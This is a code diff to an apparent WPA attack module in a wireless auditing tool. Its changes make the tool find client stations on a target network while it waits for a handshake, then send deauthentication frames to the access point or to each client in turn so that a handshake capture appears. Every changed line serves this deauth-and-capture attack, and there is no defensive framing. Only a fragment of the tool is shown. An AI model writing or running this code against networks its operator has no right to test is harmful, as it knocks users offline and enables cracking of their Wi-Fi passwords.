@@ -31,7 +31,8 @@ class AttackWPA(Attack):
             Color.p('\r{+} {O}waiting{W} for target to appear...')
             airodump_target = self.wait_for_target(airodump)
  
-            clients = airodump_target.clients
+            # Get client station MAC addresses
+            clients = [c.station for c in airodump_target.clients]
             client_index = 0
 
             handshake = None
@@ -41,9 +42,12 @@ class AttackWPA(Attack):
             deauth_proc = None
 
             while True:
-                time.sleep(1)
-                Color.clear_line()
+                if not deauth_proc or deauth_proc.poll() != None:
+                    # Clear line only if we're not deauthing right now
+                    Color.p('\r%s\r' % (' ' * 70))
                 Color.p('\r{+} waiting for {C}handshake{W}...')
+
+                time.sleep(1)
 
                 # Find .cap file
                 cap_files = airodump.find_files(endswith='.cap')
@@ -71,16 +75,25 @@ class AttackWPA(Attack):
                     # Deauth process is still running
                     time_since_deauth = time.time()
 
+                # Look for new clients
+                airodump_target = self.wait_for_target(airodump)
+                for client in airodump_target.clients:
+                    if client.station not in clients:
+                        Color.pl('\r{+} discovered {G}client{W}:' +
+                                 ' {C}%s{W}' % client.station)
+                        Color.p(' ' * len(' [+] waiting for handshake... '))
+                        clients.append(client.station)
+
                 # Send deauth to a client or broadcast
                 if time.time()-time_since_deauth > Configuration.wpa_deauth_timeout:
                     # We are N seconds since last deauth was sent,
                     # And the deauth process is not running.
                     if len(clients) == 0 or client_index >= len(clients):
-                        deauth_proc = self.deauth(airodump_target.bssid)
+                        deauth_proc = self.deauth(bssid)
                         client_index = 0
                     else:
                         client = clients[client_index]
-                        deauth_proc = self.deauth(client.bssid)
+                        deauth_proc = self.deauth(bssid, client)
                         client_index += 1
                     time_since_deauth = time.time()
                 continue
